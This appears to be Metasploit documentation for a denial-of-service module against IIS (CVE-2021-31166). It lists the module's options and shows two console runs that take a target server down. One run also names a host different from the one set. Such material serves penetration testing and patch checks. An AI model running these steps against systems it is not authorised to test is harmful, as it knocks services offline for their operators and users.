## Vulnerable Application

IIS web server on Windows 10 and Windows Server version 20H2 and 2004 without KB5003173.

### Source

 - [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166)

## Options

### RHOST

 - **Required**
 - Type: **address**
 - *No default value*

Should be the weak IIS server address.

### RPORT

 - **Required**
 - Type: **integer**
 - Default value: **80**

Should be the weak IIS server port.

### TARGETURI

 - **Optional**
 - Type: **string**
 - Default value: **/**

## Scenarios

```text
msf6 > use exploit/windows/iis/rb_dos_iis_2021_31166
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > exploit
[*] Running module against 10.10.10.10

[+] Target is down.
[*] Auxiliary module execution completed
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) >
```

```text
msf6 > use exploit/windows/iis/rb_dos_iis_2021_31166 
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set RPORT 80
RPORT => 80
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set TARGETURI "/test/"
TARGETURI => /test/
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) > exploit
[*] Running module against 192.168.56.9

[*] Trying first connection...
[+] First connection OK. Sending payload...
[+] Payload is sent. Check that the server is down...
[-] The connection was refused by the remote host (10.10.10.10:80).
[+] Target is down.
[*] Auxiliary module execution completed
msf6 auxiliary(windows/iis/rb_dos_iis_2021_31166) >
```

## Reference

 - [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-31166)
 - [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2021-31166)
